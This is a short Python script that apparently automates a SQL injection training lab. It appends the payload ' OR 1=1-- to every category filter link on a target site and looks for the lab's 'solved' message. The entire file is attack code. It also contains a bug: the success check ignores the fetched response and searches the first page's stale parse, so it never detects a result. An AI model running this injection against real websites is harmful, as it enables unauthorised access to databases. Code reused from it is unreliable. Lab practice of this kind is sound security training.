import requests
import argparse 
from bs4 import BeautifulSoup
import time

class WebChecker:
	def __init__(self):
		self.response = None
		self.sqli = ' OR 1=1--'

	def check_alive(self, url):
		self.url = url
		self.response = requests.get(url)
		if self.response.status_code == 200:
			print('Web Server is alive')
		else:
			raise Exception('Web server seems to be down')

	def check_sqli(self, html_text):
		checked_html = self.soup.find(string="Congratulations, you solved the lab!")
		print(checked_html)

	def find_hrefs(self):
		self.soup = BeautifulSoup(self.response.text, features="html.parser")
		links = self.soup.find_all('a', class_='filter-category')
		self.hrefs = [link.get('href') for link in links]

	def sqli_inject(self):
		for href in self.hrefs:
			if href == '/':
				pass
			else:
				time.sleep(0.2)
				self.response = requests.get(self.url+href[1:100]+self.sqli)
				if self.response.status_code == 200:
					self.check_sqli(self.response.text)

	def main(self):
		parser = argparse.ArgumentParser()
		parser.add_argument("url", type=str, help="Url of the lab")
		args = parser.parse_args()
		self.check_alive(args.url)
		self.find_hrefs()
		self.sqli_inject()


if __name__ == "__main__":
	checker = WebChecker()
	checker.main()